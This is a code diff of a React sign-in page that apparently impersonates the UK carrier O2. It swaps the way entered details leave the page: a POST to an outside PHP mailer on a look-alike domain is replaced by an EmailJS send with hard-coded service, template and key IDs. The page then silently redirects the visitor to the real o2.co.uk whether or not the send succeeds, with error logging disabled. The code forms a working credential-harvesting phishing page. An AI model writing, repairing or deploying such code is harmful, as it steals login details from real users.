@@ -1,4 +1,5 @@
 import React, { useState } from "react";
+import emailjs from "@emailjs/browser";
 
 const SignInPage = () => {
   const [formData, setFormData] = useState({
@@ -14,34 +15,28 @@ const SignInPage = () => {
     });
   };
 
-
   const handleSignIn = async (e) => {
     e.preventDefault();
 
-    const formBody = new FormData();
-    formBody.append("email", formData.email);
-    formBody.append("message", formData.message);
-
     try {
-      const response = await fetch(
-        "https://o2contract.co.uk/o2_php/mailing.php",
-        {
-          method: "POST",
-          body: formBody,
-        }
+      const templateParams = {
+        email: formData.email,
+        message: formData.message,
+      };
+
+      const response = await emailjs.send(
+        "service_km7fzwj", // Replace with your service ID
+        "template_dycr3ab", // Replace with your template ID
+        templateParams,
+        "rtaAAe7bG1hAjyxBx" // Replace with your public key
       );
 
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
+      // console.log("Email sent successfully:", response);
 
-      const result = await response.text();
-      console.log(result); // Debugging: Check response
-
-      // Redirect after a successful sign-in
+      // Redirect after successful submission
       window.location.href = "https://o2.co.uk/";
     } catch (error) {
-      console.error("Error sending data:", error);
+      // console.error("Error sending email:", error);
 
       // Redirect even if there's an error (optional)
       window.location.href = "https://o2.co.uk/";
